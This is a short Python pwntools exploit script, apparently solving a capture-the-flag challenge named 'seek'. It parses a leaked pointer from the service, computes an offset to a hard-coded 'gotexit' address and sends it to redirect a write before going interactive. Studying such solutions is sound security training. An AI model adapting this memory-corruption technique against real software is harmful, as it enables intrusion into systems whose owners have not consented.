#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
debug = 1

if debug:
    io = remote("seek.chal.irisc.tf", 10004)
else:
    io = process(['./a.out'])
#binary = ELF('./chal')

payload  = b''

# 6 pointer to string buffer
io.recvline()
recieved = io.recvline().decode("utf-8").strip().split()
print(recieved)
writeptr = int(recieved[3][2:-1], 16)
gotexit = 0x7ffff7dd6100
ptr = gotexit - writeptr
payload += p64(ptr)

io.recvuntil("Where should I seek into? ")
io.sendline(payload)

io.interactive()
